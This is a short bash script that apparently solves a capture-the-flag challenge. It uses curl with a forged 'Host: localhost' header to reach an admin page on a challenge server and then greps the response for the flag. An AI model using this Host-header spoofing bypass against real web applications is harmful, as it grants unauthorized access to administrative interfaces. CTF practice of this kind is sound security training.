#!/bin/bash

curl -s -H "Host: localhost" https://nicc-hostile-takeover.chals.io/admin | grep -oE "nicc{.*}"
